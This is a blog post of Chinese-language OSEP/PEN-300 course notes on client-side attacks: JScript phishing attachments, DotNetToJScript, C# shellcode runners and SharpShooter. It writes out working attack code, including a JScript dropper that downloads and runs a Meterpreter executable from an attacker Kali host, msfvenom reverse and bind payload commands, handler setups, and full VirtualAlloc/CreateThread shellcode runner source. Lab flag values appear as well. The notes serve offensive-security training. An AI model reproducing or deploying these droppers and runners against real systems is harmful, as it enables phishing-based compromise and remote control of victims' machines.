---
title: "[OSEP, PEN-300] Instructional notes - Part 2"
date: 2026-07-27
author: "CHW"
tags:
  - offsec
description: "OSWE PEN-300 筆記 Part 2，涵蓋 JScript Phishing、DotNetToJScript、C# Shellcode Runner、SharpShooter、PowerShell Reflection、Win32 API 與 Reflective C# Client-Side Attacks 等等。"
---

[OSEP, PEN-300] Instructional notes - Part 2
===


# Table of Contents
[TOC]

# [Link back to: "[OSEP, PEN-300] Instructional notes - Part 1"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-1/)
>[!Caution]
> 接續 [[OSWE, WEB-300] Instructional notes - Part 1](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-1/) 內容

# Phishing with Jscript
從前面的 VBA Macro、ICS、ZIP DLL sideloading，轉到另一種 client-side execution 

由 [Windows Script Host](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wscript) 執行的 Microsoft JScript 
```
受害者收到 .js 附件
→ 點擊
→ Windows Script Host 執行
→ JScript 建立 ActiveXObject
→ 呼叫 Windows 元件
→ 啟動外部程式或後續 payload
```

>[!Warning]
> 近期出現的基於 Jscript 的高階惡意軟體包括 [TrickBot](https://www.bromium.com/deobfuscating-ostap-trickbots-javascript-downloader/) 和 [Emotet](https://security-soup.net/a-quick-look-at-emotets-updated-javascript-dropper/)

## Creating a Basic Dropper in Jscript

1. JavaScript
JavaScript 是一般網頁瀏覽器主要使用的 scripting language，依據 [ECMAScript](https://en.wikipedia.org/wiki/ECMAScript) standard 通常搭配：HTML, CSS, DOM, Browser APIs \
在瀏覽器裡執行時，會受到 sandbox 限制 

2. JScript 
JScript 是 Microsoft 開發的 JavaScript dialect，過去主要用於：
`Internet Explorer`, `Windows Script Host`, `Classic ASP`
當 JScript 透過 [Windows Script Host](https://en.wikipedia.org/wiki/Windows_Script_Host) 執行時，它不在瀏覽器 sandbox 裡，因此它可以存取 ActiveX, COM objects, WScript object model, Windows applications, File system, Registry, Network objects 等等，也是可以被用作 client-side execution vector 的原因

### Execution of Jscript on Windows
在 Settings > Apps > Default apps > Choose defaults by file type 可以看到
Windows 主要根據副檔名判斷要用什麼程式開啟:
- `.txt` → Notepad
- `.pdf` → PDF reader
- `.docx` → Microsoft Word
- `.ps1` → 通常 Notepad
- `.js` → Windows Script Host

![image](https://hackmd.io/_uploads/BkZJLhgNMe.png)

其中看到 `.ps1` 是透過 Notepad 開啟，這樣會造成無法利用 PowerShell 直接執行腳本
![image](https://hackmd.io/_uploads/rJLzL2eEfg.png)

`.js` 比 `.ps1` 更適合作為 phishing attachment：\
(只要 user 點擊就會直接執行)\
![image](https://hackmd.io/_uploads/B1e9L2gEMl.png)

在 Web Broswer 之外執行 JavaScript 會繞過所有安全設定。讓攻擊者能夠利用舊版 [ActiveX](https://en.wikipedia.org/wiki/ActiveX) technology 和 Windows Script Host engine 進行互動:\
透過呼叫 [ActiveXObject](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/automat/activex-objects) 建構函式並提供 object name 來利用 ActiveX\
使用 WScript.Shell 與 Windows Script Host Shell 交互，從而執行外部 Windows 應用程式\
例如透過 ActiveXObject 建構函數從 WScript.Shell 類別 instantiate 一個名為「shell」的 Shell 對象，並透過 Run 命令執行 cmd.exe 
```powershell
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("cmd.exe");
```
建立 test.js 點擊可以直接呼叫 `cmd.exe`\
![image](https://hackmd.io/_uploads/SyVqe6gNGl.png)

Flag exploit:
```js
var shell = new ActiveXObject("WScript.Shell");

function generateFlag() {
    var part1 = String.fromCharCode(56, 50, 55, 54, 54, 55, 54, 99);
    var part2 = Number("972") + "ee0" + String.fromCharCode(99, 51);
    var part3 = ["e1", "1109", "a3"].join("");
    var part4 = "730a05da";

    return "OS{" + part1 + part2 + part3 + part4 + "}";
}

function runCommand() {
    shell.Run("cmd.exe /c echo Flag generation complete...");
}

function main() {
    runCommand();
    var flag = generateFlag();
    WScript.Echo("Your flag is: " + flag);
}

main();
```

### JScript Meterpreter Dropper
啟動 cmd.exe 的 JScript，擴充成一個完整的 downloader/dropper
```
Kali 產生 met.exe
→ Kali HTTP server 提供 met.exe
→ Metasploit handler 等待 callback
→ 受害者執行 .js
→ JScript 用 HTTP GET 下載 met.exe
→ ADODB.Stream 將 binary 寫入磁碟
→ WScript.Shell.Run() 執行 met.exe
→ met.exe 連回 Kali handler
```
先使用 msfvenom 產生 met.exe 的 64-bit Meterpreter reverse HTTPS exe，並將其儲存到 Kali 的 Web 根目錄。我們還將設定一個 Metasploit multi/handler 來擷取 session

在 Windows 使用 JavaScript 傳送一個簡單的 HTTP GET 請求\
可以使用基於 [Microsoft XML Core Services](https://en.wikipedia.org/wiki/MSXML) 及 MSXML2.XMLHTTP object 的 HTTP protocol parser
```
var url = "http://<Kali IP>/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();
```
利用 Windows Script Host 的 CreateObject method 實例化 MSXML2.XMLHTTP object ，然後使用 Open 和Send 方法執行 HTTP GET 請求

(Kali 產生 reverse_https EXE)
```
msfvenom -p windows/x64/meterpreter/reverse_https  LHOST=192.168.45.157 LPORT=443 EXITFUNC=thread -f exe -o met.exe
```
![image](https://hackmd.io/_uploads/rkMNSCgVze.png)

開 HTTP server 提供下載
```
sudo python3 -m http.server 80
```

(在 Kali 開啟 msfconsole 監聽)
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST <Kali IP>
set LPORT 443
set ExitOnSession false
set EnableStageEncoding false
```

在 Windows 建構 JS request
```js
var url = "http://{Kali IP}/met.exe";
var http = WScript.CreateObject("MSXML2.XMLHTTP");

http.Open("GET", url, false);
http.Send();

if (http.Status == 200) {
    var stream = WScript.CreateObject("ADODB.Stream");

    stream.Open();
    stream.Type = 1;
    stream.Write(http.ResponseBody);
    stream.Position = 0;

    stream.SaveToFile("met.exe", 2);
    stream.Close();

    new ActiveXObject("WScript.Shell").Run("met.exe");
} else {
    WScript.Echo("Download failed. HTTP status: " + http.Status);
}
```
> 透過 JScript 下載 met.exe 再 Run("met.exe")

在 Kali 成功截取 HTTP Reverse shell
```
getuid  → 目前使用者
sysinfo → 主機名稱、Windows 版本、架構
getpid  → Meterpreter 所在 process PID
shell   → 取得一般 Windows CMD
```
![image](https://hackmd.io/_uploads/B1cAo0xVze.png)

Flag2 exploit:
```js
var url = "http://192.168.45.157/met.exe";
var Object = WScript.CreateObject("MSXML2.XMLHTTP");

Object.Open("GET", url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject("ADODB.Stream");

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();

    var r = new ActiveXObject("WScript.Shell").Run("met.exe");

    function generateFlag() {
        var part1 = String.fromCharCode(49, 54, 55);
        var part2 = String.fromCharCode(101, 55, 53);
        var part3 = String.fromCharCode(49, 53, 51, 100);
        var part4 = String.fromCharCode(51, 97, 97, 48);
        var part5 = String.fromCharCode(50, 51, 52, 55);
        var part6 = String.fromCharCode(48, 51, 57, 97);
        var part7 = String.fromCharCode(52, 56, 98, 98);
        var part8 = String.fromCharCode(49, 55, 99, 101, 53, 54);

        return "OS{" +
            part1 +
            part2 +
            part3 +
            part4 +
            part5 +
            part6 +
            part7 +
            part8 +
            "}";
    }

    var flag = generateFlag();
    WScript.Echo("Your flag is: " + flag);
}
else
{
    WScript.Echo("Download failed. HTTP status: " + Object.Status);
}
```
## JScript and C#
把前面的 JScript 從下載並執行 EXE 提升成
```
JScript
→ 內嵌已編譯的 C# assembly
→ 透過 .NET 呼叫 Win32 API
→ 在記憶體中執行 payload
```
上述利用 JScript dropper 將 payload 落地到磁碟，容易被防毒掃描且會留下明顯檔案\
嘗試不直接下載 EXE，不必將完整 payload 存成執行檔\
改由 JScript 載入 C# assembly ，再由 C# 呼叫 Win32 API

### Introduction to Visual Studio
先建立一個基礎開發環境: 選用常見 [integrated development environments](https://en.wikipedia.org/wiki/Integrated_development_environment) (IDEs)  [Mono](https://www.mono-project.com/docs/about-mono/languages/csharp/) 和 Microsoft Visual Studio

環境範例 dev01 / Windows development VM revert 後本機新增的程式碼可能消失，以 Kali SAMBA 作為持久化的 network file server
```
┌──(chw💲CHW)-[~]
└─$ sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
[2026-07-12 06:57:30] sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
[sudo] password for chw: 

┌──(chw💲CHW)-[~]
└─$ sudo vi /etc/samba/smb.conf 
[2026-07-12 07:23:26] sudo vi /etc/samba/smb.conf

┌──(chw💲CHW)-[~]
└─$ sudo cat /etc/samba/smb.conf    
[2026-07-12 07:25:31] sudo cat /etc/samba/smb.conf
[visualstudio]
 path = /home/chw/data
 browseable = yes
 read only = no
```
Samba 設定內容: `[visualstudio]` 為 share name
Windows 會透過 `\\KALI_IP\visualstudio` 存取

建立一個可以存取共享的 Samba 用戶，並開啟服務
```
┌──(chw💲CHW)-[~]
└─$ sudo smbpasswd -a kali
[2026-07-12 07:32:25] sudo smbpasswd -a kali
New SMB password:
Retype new SMB password:
Failed to add entry for user kali.

┌──(chw💲CHW)-[~]
└─$ sudo systemctl start smbd
[2026-07-12 07:32:41] sudo systemctl start smbd

┌──(chw💲CHW)-[~]
└─$ sudo systemctl start nmbd
[2026-07-12 07:32:46] sudo systemctl start nmbd
```
> - smbd: 主要 SMB file-sharing service，負責檔案共享、認證、檔案讀寫、SMB protocol
> - nmbd: 較舊的 NetBIOS name service，負責名稱解析與網路瀏覽相關功能

![image](https://hackmd.io/_uploads/S1Iy3x-NMl.png)

開啟讀寫權限：
```
┌──(chw💲CHW)-[~]
└─$ mkdir /home/chw/data 
[2026-07-12 07:35:39] mkdir /home/chw/data                                                          
┌──(chw💲CHW)-[~]
└─$ chmod -R 777 /home/chw/data 
[2026-07-12 07:35:49] chmod -R 777 /home/chw/data
```
透過 RDP 至 Kali SAMBA 成功登入：\
![image](https://hackmd.io/_uploads/SyUR-IGVfg.png)

確認 Samba 連線成功後，透過 Visual Studio 建立新專案
![image](https://hackmd.io/_uploads/rJetG8fEfe.png)
![image](https://hackmd.io/_uploads/SyptGIMVzx.png)

>[!Tip]
>為什麼使用網路 Share 當 Visual Studio 專案位置?
>> Windows VM revert 不會刪除 Kali 檔案\
>> 可以從 Kali 備份、查看與編輯\
>> 不同 Windows lab machine 可以共用\

專案路徑選擇 Kali Share folder:\
![image](https://hackmd.io/_uploads/ryRoQLfNfx.png)

Visual Studio 建立後會有
```
Solution
└── Project
```
- Solution 是較上層的容器，可以包含多個 project
- Project 是一個可獨立編譯的單位

![image](https://hackmd.io/_uploads/SJGfS8GEMe.png)

預設 C# Console App:
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
        }
    }
}
```
> - `using ...;`: namespace import
> - `namespace ConsoleApp1`: namespace 用來組織程式碼，避免類別名稱衝突
> - `class Program`: 定義類別，C# 程式的程式碼通常放在 class 
> - `static void Main(string[] args)`: Main 是 console application 的 entry point
> > ```
> > ConsoleApp1.exe one two
> > ```
> > 👉🏻 `args[0] = "one"`, `args[1] = "two"`

建立一個簡單的 application，先使用 `Console.WriteLine` method 在運行時向 console 列印 Developer 認識的第一個句子
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello World");
        }
    }
}
```
![image](https://hackmd.io/_uploads/HkfHP8MNfe.png)

Debug 與 Release 差異:
- Debug 適合開發與除錯
    - debug symbols
    - 較少最佳化
    - 額外除錯資訊
    - 較容易逐行追蹤
- Release
    - 啟用最佳化
    - 較少除錯資訊
    - 輸出較精簡
    - 執行更接近正式版本

選擇 Release 可減少可能觸發掃描的 debugging information\
![image](https://hackmd.io/_uploads/HkyyuIzVzx.png)

接著選擇 Build > Build Solution\
![image](https://hackmd.io/_uploads/SJE8OIGVMl.png)
編譯輸出路徑: `\\192.168.45.217\visualstudio\ConsoleApp1\ConsoleApp1\bin\Release\ConsoleApp1.exe`

在 Powershell 嘗試執行以確保編譯成功\
![image](https://hackmd.io/_uploads/SJMC_UM4ze.png)

### DotNetToJscript
上述將 C# source → Visual Studio 編譯 → .exe / .dll → 直接執行\
進一步
```
C# source
→ 編譯成 .NET assembly
→ DotNetToJScript 將 assembly 序列化並嵌入 .js
→ 使用者執行 .js
→ Windows Script Host 載入 CLR
→ assembly 在記憶體中還原並執行
```
在 2017 security researcher [James Forshaw](https://twitter.com/tiraniddo) 創建了  [DotNetToJscript](https://github.com/tyranid/DotNetToJScript) project\
證明 Windows Script Host 的 JScript 可以透過 COM / ActiveX 與 .NET Framework 互動並載入序列化的 .NET assembly\
主要用途是將編譯好的 .NET DLL 輸出包含該 assembly 的 JScript

使用 DotNetToJscript 建立記憶體 shellcode runner

將環境範例 DotNetToJScript/ 複製到 Kali SMB\
![image](https://hackmd.io/_uploads/H1GPZwz4fg.png)

使用 Virtual Studio 開起 DotNetToJScript Soluiton 會跳出  potential for malicious code 的告警\
![image](https://hackmd.io/_uploads/r1F0VDGNzx.png)

然後...會跳出第二個告警 XD\
提醒將 Framework 更新到 .NET Framework 4.8\
![image](https://hackmd.io/_uploads/BymBBDM4zl.png)

將 Program.cs L154 註解掉只檢查 .NET version 2 (移除舊版檢查)\
![image](https://hackmd.io/_uploads/SkpVUvMEzl.png)

Solution 中有兩個 Project:
- DotNetToJScript project
負責讀取 .NET assembly、序列化、產生 JScript、嵌入 Base64 blob，輸出 DotNetToJScript.exe
- ExampleAssembly project
要被 JScript 載入執行的 C# assembly，輸出 ExampleAssembly.dll
```
ExampleAssembly.dll
→ 交給 DotNetToJScript.exe
→ 產生 demo.js
```

查看 TestClass.cs:
```csharp
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
        MessageBox.Show(
            "Test",
            "Test",
            MessageBoxButtons.OK,
            MessageBoxIcon.Exclamation
        );
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```
> - `using System.Diagnostics`: Process.Start(...) 啟動外部 process
> - `using System.Runtime.InteropServices`: [ComVisible(true)] 讓該 class 對 COM 可見 (DotNetToJScript 的整個技巧依賴 JScript、ActiveX/COM 與 CLR 之間的互動)
> - `using System.Windows.Forms`: MessageBox.Show(...) 顯示測試視窗
>
> 當 JScript 執行 `CreateInstance(entry_class)` CLR 會建立 TestClass instance\
> 建立 instance 時會自動呼叫 constructor
> ```
> CreateInstance("TestClass")
> → new TestClass()
> → constructor 執行
> → MessageBox 顯示
> ```

接著 Build Solution 需要 `DotNetToJScript.exe`, `NDesk.Options.dll`, `ExampleAssembly.dll`\
1. 至 DotNetToJScript/bin/Release ，並將 DotNetToJscript.exe 和 NDesk.Options.dll 複製到 Windows 11 開發機器上的 C:\Tools 資料夾
2. ExampleAssembly/bin/Release資料夾，並將ExampleAssembly.dll複製到C:\Tools 資料夾

![image](https://hackmd.io/_uploads/B1JFmpmVMg.png)
```
C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
```
> - `--ver=v4`: 指定使用 CLR / .NET Framework v4

![image](https://hackmd.io/_uploads/HJ81ETQEGl.png)\
點擊 demo.js 發生什麼事：
```
使用者雙擊 demo.js
→ wscript.exe 執行 JScript
→ JScript 設定 CLR v4
→ 將 Base64 blob 解碼成 MemoryStream
→ BinaryFormatter 還原序列化內容
→ DynamicInvoke
→ CreateInstance("TestClass")
→ TestClass constructor
→ MessageBox.Show("Test")
```


查看 demo.js
```javascript
function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAA...

var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}
```
![image](https://hackmd.io/_uploads/r18EVaQNGx.png)
> - `function setversion()`: 設定目前 process 的環境變數，告訴 CLR hosting 邏輯使用 .NET Framework 4 CLR
> - `function debug(s) {}`: 產生 JScript 時沒有使用 debug flag
> - `base64ToStream()`: Base64 字串 → 轉成 bytes → Base64 decode → 寫入 MemoryStream → 回傳 MemoryStream
> - `MemoryStream`: serialized_obj Base64 → decode → MemoryStream → BinaryFormatter Deserialize
> - `var serialized_obj = "AAEAAAD/////AQAAAA...";`: DotNetToJScript 產生的序列化內容，包含可協助載入 assembly 的 object graph / delegate
> - `var entry_class = 'TestClass';`: 指定要建立的 C# class 必須和 assembly 內的名稱一致 ("public class TestClass")
> - `new ActiveXObject( 'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter' );`: 把 MemoryStream 裡的序列化 .NET object 還原
> - `DynamicInvoke()`: 動態呼叫該 delegate，最終提供可取得或載入 assembly 的 object
> - `CreateInstance()`: 在已載入的 assembly 中建立指定 class 的 instance 👉🏻 TestClass
> > `BinaryFormatter` 是高風險 API，反序列化不信任資料可能造成任意程式碼執行

### Win32 API Calls From C#
上述能夠讓 C# 能夠直接呼叫 Windows 原生 API
JScript → DotNetToJScript → 載入 C# assembly\
接著補上 P/Invoke → Win32 API\
後續就能在 C# 中呼叫 `MessageBox`, `VirtualAlloc`, `CreateThread`, `WaitForSingleObject` 等 Windows API

C# 不能直接呼叫這些 native functions (`user32.dll`, `kernel32.dll` , ...etc)，必須先透過 Platform Invocation Services (P/Invoke)\
P/Invoke 的核心 👉🏻 `[DllImport("user32.dll")]`\
告訴 CLR 這個方法不是 C# 實作的，存在於指定的 native DLL\
執行時請載入 DLL 並呼叫該函式

[環境範例]\
利用 MessageBoxA 驗證，MessageBoxA 位於 user32.dll
```
C# P/Invoke 宣告正確
DLL 載入成功
資料型別轉換正確
Win32 API 呼叫成功
```
> 利用 [pinvoke](https://pinvoke.net/default.aspx/user32/MessageBox.htm) 可以將 C data types 轉成 C# data types

```csharp
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);

        static void Main(string[] args)
        {
            MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0);
        }
    }
}
```
> - `[DllImport("user32.dll")]`: 指定 native function 在 user32.dll (user32.dll 主要提供視窗、訊息框、鍵盤滑鼠輸入、桌面 GUI、視窗管理)
> - `CharSet = CharSet.Auto`: 表示字串 marshaling 方式由 runtime 根據平台決定
>    - `MessageBoxA` A = ANSI
>    - `MessageBoxW` W = Unicode / UTF-16
> - `static`: 不需要建立 Program class instance
> - `IntPtr.Zero`: 第一個參數是 hWnd 代表 parent window handle (NULL = 沒有指定 parent window)

完成整體架構後，仍需要 `System.Runtime.InteropServices` 不然會顯示 "The type or namespace name 'DllImport' could not be found" Error
```csharp
using System.Runtime.InteropServices;
```
也可以不用 using，直接寫完整名稱 `[System.Runtime.InteropServices.DllImport("user32.dll")]`

完整 TestClass.cs
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);

        static void Main(string[] args)
        {
             MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0);
        }
    }
}
```
![image](https://hackmd.io/_uploads/HJfLi3oEMl.png)
```
ConsoleApp1.exe 啟動
→ CLR 執行 Main()
→ P/Invoke 載入 user32.dll
→ 找到 MessageBox
→ marshaling C# 參數
→ 呼叫 Win32 API
→ 顯示視窗
```

### Shellcode Runner in C#
已驗證 C# 可以透過 DllImport 呼叫 Win32 API，接著在記憶體執行流程 👉🏻 Shellcode Runner
```
C# 程式啟動
→ 在記憶體配置區域
→ 把 byte[] payload 複製進去
→ 建立 thread 執行該位置
→ 等待 thread
```
第一步是使用 DllImport 導入三個 Win32 API 並配置相應的  argument data types:
- `VirtualAlloc`
在目前 process 的虛擬記憶體空間中配置一塊區域
```csharp
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAlloc(
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect
);
```
> - `lpAddress`: 希望配置的位置，IntPtr.Zero 表示由 Windows 決定
> - `dwSize`: 要配置的大小
> - `flAllocationType`: 配置方式，例如 Reserve、Commit
> - `flProtect`: 記憶體保護屬性
>
>`0x3000`: MEM_COMMIT | MEM_RESERVE\
>`0x40`: PAGE_EXECUTE_READWRITE\
>👉🏻 可讀可寫可執行

- `CreateThread`
建立一個新的 Windows thread 並從指定的記憶體位址開始執行
```csharp
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(
    IntPtr lpThreadAttributes,
    uint dwStackSize,
    IntPtr lpStartAddress,
    IntPtr lpParameter,
    uint dwCreationFlags,
    IntPtr lpThreadId
);
```
> - `lpStartAddress = addr`: addr 就是前面配置並寫入 shellcode 的記憶體位置

CreateThread\
→ 將 instruction pointer 指向 shellcode\
→ 開始執行 shellcode

- `WaitForSingleObject`
等待指定 handle 對應的物件進入完成或 signaled 狀態
```csharp
[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(
    IntPtr hHandle,
    UInt32 dwMilliseconds
);
```
> `0xFFFFFFFF`: INFINITE 無限等待

接著需要產生 shell code ，在 64-bit Windows OS 上，Jscript 預設在 64-bit context 中執行，因此須產生一個 csharp 撰寫的 64-bit Meterpreter staged payload。並使用相同的 multi/handler

建構 managed C# byte array (`buf`) ，利用 msfvenom 建構 bind shell payload
```
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 EXITFUNC=thread -f csharp
```
![image](https://hackmd.io/_uploads/HJ0uRepNMg.png)

```csharp
byte[] buf = new byte[626] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8...

int size = buf.Length;

IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

Marshal.Copy(buf, 0, addr, size);

IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

WaitForSingleObject(hThread, 0xFFFFFFFF);
```

完整的 C# shellcode runner
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[630] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
  ...
  0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
執行流程：
```
1. byte[] buf 保存 shellcode

2. size = buf.Length
   取得 shellcode 大小

3. VirtualAlloc(...)
   配置 RWX 記憶體

4. Marshal.Copy(...)
   將 shellcode 複製到該區域

5. CreateThread(...)
   以該記憶體位址作為 thread entry point

6. WaitForSingleObject(...)
   防止主程式過早退出
```

需要將 CPU 架構設為 x64\
![image](https://hackmd.io/_uploads/ByM-lWpVMx.png)\
![image](https://hackmd.io/_uploads/SksbgW64zg.png)

BTW 需要用 Metasploit 連線到 bind Meterpreter
```
msfconsole
-
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOSTS <TARGET_IP>
set LPORT 4444
run
```

>[!Note]
>Staged 與 stageless 差異：
>- `windows/x64/meterpreter/bind_tcp`: staged Meterpreter bind payload
>![image](https://hackmd.io/_uploads/rkzyWbp4Mx.png)
>- `windows/x64/meterpreter_bind_tcp`: stageless 版本，完整 Meterpreter 邏輯直接包含在 shellcode 中，通常 byte array 會大很多
>![image](https://hackmd.io/_uploads/rkZlbWTVzg.png)


### Jscript Shellcode Runner
前一節已成夠編譯獨立的 C# console application，程式入口在 `static void Main(string[] args)` 必須執行 EXE 觸發\
接著利用：
```
C# TestClass.cs
→ 編譯成 ExampleAssembly.dll
→ DotNetToJScript
→ runner.js
→ wscript.exe 執行 runner.js
→ 記憶體中載入 ExampleAssembly
→ 建立 TestClass instance
→ constructor 執行 shellcode runner
```
將 shellcode runner 要放進 constructor ，建立 instance 自動執行

DllImport 宣告需要放在 TestClass class 裡，但不能在 constructor 或其他 method

完整 TestClass 結構：
```csharp
using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(
        IntPtr hHandle,
        uint dwMilliseconds
    );

    public TestClass()
    {
        byte[] buf =
        {
            // x64 shellcode bytes
        };

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(
            IntPtr.Zero,
            (uint)size,
            0x3000,
            0x40
        );

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(
            IntPtr.Zero,
            0,
            addr,
            IntPtr.Zero,
            0,
            IntPtr.Zero
        );

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```
編譯 ExampleAssembly
```
C:\Tools\
├── DotNetToJScript.exe
├── NDesk.Options.dll
└── ExampleAssembly.dll
```
產生 runner.js
```powershell
C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```

### SharpShooter
[SharpShooter](https://github.com/mdsecactivebreach/SharpShooter) 則把大量重複工作包成一個 payload generation framework
```
原始 shellcode
→ SharpShooter
→ 自動產生 JScript / VBScript 等 delivery payload
→ Windows Script Host 執行
```
>[!Warning]
>SharpShooter 使用 Python 2 開發，🥚 Python 2 已經停止安全更新

```
┌──(chw💲CHW)-[~]
└─$ cd /opt/

┌──(chw💲CHW)-[/opt]
└─$ sudo curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py

┌──(chw💲CHW)-[/opt]
└─$ sudo python2 ./get-pip.py

┌──(chw💲CHW)-[/opt]
└─$ sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git
Cloning into 'SharpShooter'...

┌──(chw💲CHW)-[/opt]
└─$ cd SharpShooter/

┌──(chw💲CHW)-[/opt/SharpShooter]
└─$ sudo python2 -m pip install --upgrade setuptools pip==20.3.4

┌──(chw💲CHW)-[/opt/SharpShooter]
└─$ sudo pip2 install -r requirements.txt
```
![image](https://hackmd.io/_uploads/ByL8ez6NMg.png)

在環境範例中使用：
- 先產生 raw shellcode
執行方向是 Windows target → Kali handler，所以使用 reverse_https
```
msfvenom \
  -p windows/x64/meterpreter/reverse_https \
  LHOST=<KALI-IP> \
  LPORT=443 \
  -f raw \
  -o /var/www/html/shell.txt
```
![image](https://hackmd.io/_uploads/rJizPMpVzg.png)
> raw binary shellcode

- SharpShooter 指令
```
python2 SharpShooter.py \
  --payload js \
  --dotnetver 4 \
  --stageless \
  --rawscfile /var/www/html/shell.txt \
  --output test
```
> - `--payload js`: 指定 delivery payload 格式 JScript
> - `--dotnetver 4`: 指定目標使用 .NET Framework 4
> - `--stageless`: stageless 不另外透過 HTML smuggling 分階段傳送 JScript
> - `--rawscfile`: 從這個檔案讀取 raw shellcode

![image](https://hackmd.io/_uploads/HkP7_zTEGl.png)
> 將 test.js 複製到目標機器上。點擊檔案即可獲得 reverse shell

```
test.js
→ wscript.exe
→ CLR v4
→ 載入 .NET assembly
→ VirtualAlloc
→ 複製 shellcode
→ 執行 shellcode
→ reverse HTTPS callback
```

同時要開好 meterpreter handler
```
msfconsole
-
